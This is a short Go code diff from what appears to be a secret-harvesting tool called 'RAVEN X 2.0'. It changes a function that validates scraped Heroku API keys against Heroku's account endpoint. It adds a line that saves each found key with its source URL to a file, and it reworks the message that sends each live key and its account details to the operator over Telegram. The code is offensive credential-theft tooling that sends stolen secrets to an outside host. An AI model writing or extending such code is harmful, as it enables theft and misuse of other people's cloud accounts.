@@ -23,6 +23,8 @@ func (a *AWSScanner) CheckHeroku(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "heroku_found.txt")
+
 	req, err := http.NewRequest("GET", "https://api.heroku.com/account", nil)
 	if err != nil {
 		return false
@@ -62,14 +64,8 @@ func (a *AWSScanner) CheckHeroku(key, sourceURL string) bool {
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🟣 <b>HEROKU LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-👤 <b>Account:</b> %s
-🔗 <b>Source:</b> %s
-`, key, info, sourceURL)
+	msg := a.tgHit("🟣", "HEROKU", sourceURL) + fmt.Sprintf(
+		"\n🔑 <b>Key:</b> <code>%s</code>\n👤 <b>Account:</b> %s\n", key, info)
 	go a.sendTelegram(msg)
 	return true
 }
